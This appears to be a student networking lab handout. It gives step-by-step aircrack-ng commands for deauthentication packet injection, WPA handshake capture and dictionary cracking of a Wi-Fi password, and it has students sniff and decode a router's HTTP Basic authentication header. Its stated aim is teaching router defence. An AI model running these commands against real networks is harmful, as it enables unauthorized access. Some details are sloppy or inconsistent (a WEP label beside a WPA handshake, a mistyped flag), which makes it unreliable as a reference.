Networking Lab Direcitons
==========================

Networking Lab Directions
Purpose: 
---------
The purpose of this networking lab is to familiarize individuals with Wireshark and also to help students learn 
how to intercept and read packets. This lab takes a look at packet sniffing and also packet injection otherwise known 
as de-authentication attacks. Familiarizing students with the knowledge on how to execute these types of attacks will help
them learn what vulnerabilities routers have and how to protect against them.

Part I: Unauthorized Wi-Fi Access
-----------------------------------
1.	Run Air Crack
2.	Run Air Dump
3.	Run Air ---------
4.	Open up terminal 
5.	Run ifconfig and note the different interfaces
6.	Run command:
airmon-ng 
7.	Take a look at the different interfaces. We will be using (insert interface here) for this lab.
8.	Execute the command:
airmon-ng (insert interface here)
9.	Do an ifconfig and take note of the new interface name.
10.	Next run the command:
airodump-ng mon0
11.	Locate the access point from the different SSID’s. What is the SSID name? What encryption type is it? What is the MAC address? What channel is it on?

12.	Execute this command:
airodump-ng –bsid {insert SSID MAC address here} --channel {SSID channel} --write {File Output Name} mon0
13.	Next we are going to do a packet injection so that we can get access to the 4-way handshake between the router and the host. Execute the following command:
aireplay-ng -0 3 -a {SSID MAC address} -c {host MAC address} mon0
14.	In order to see if the packet injection worked, we are going to have to open wireshark and look at the captured packets using the previously specified file name.
15.	What packet shows that the packet injection was successful? What protocol was used?

16.	So, now that the packet injection was successful, we can now crack the password using a dictionary attack. Execute the following command in the terminal:
aircrack-ng {insert previous file name} -w {location of dictionary} 
What is the password for the wireless network?


Part II: Unauthorized Administrator Access
--------------------------------------------
Step 1.
Browse to "http://192.168.1.1"
You will be prompted for login credentials.

With wireshark running enter the following credentials:
Username: admin
Password: HackMe

Go back to your wireshark window and locate the packet that sends the authorization information to the router.
You should see something similiar to the following:

GET /style_gn.css HTTP/1.1
Proxy-Connection: keep-alive
Authorization: Basic YWRtaW46c3VwZXJkdXBlciFAIw==
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/39.0.2171.13 Safari/537.36
DNT: 1
Referer: http://192.168.1.1/
Accept-Encoding: sdch
Accept-Language: en-US,en;q=0.8
Host: 192.168.1.1

Using the packet you captured and the credentials you were provided, can you determine the credentials passed in the example packet from above?

What are the credentials?

What algorithm was used to encode the credentials?


Part III: Reflecting
---------------------
This router was setup using WEP security and a fairly strong password. How come the admin credentials were still able to be gathered and decrypted?




What can be done to increase the overall security of this router? Please give specific answers.
